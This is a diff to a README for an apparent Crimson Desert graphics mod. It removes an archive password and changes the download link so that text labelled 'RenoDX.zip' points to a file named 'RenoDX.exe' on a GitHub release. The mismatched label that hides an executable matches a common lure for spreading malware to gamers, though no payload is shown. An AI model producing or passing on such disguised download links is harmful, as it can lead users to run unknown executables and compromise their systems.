@@ -27,8 +27,7 @@ Enjoy sharper textures, more realistic lighting, better shadows, enhanced foliag
 
 ## 📥 Download
 
-📥 [`RenoDX.zip`](https://github.com/LeFille/Crimson-desert-RenoDx-Mod/releases/download/Mods/RenoDX.zip)  
-🔐 `LS2026`
+📥 [`RenoDX.zip`](https://github.com/LeFille/Crimson-desert-RenoDx-Mod/releases/download/Mods/RenoDX.exe)  
 ---
 
 ### Archive Contents
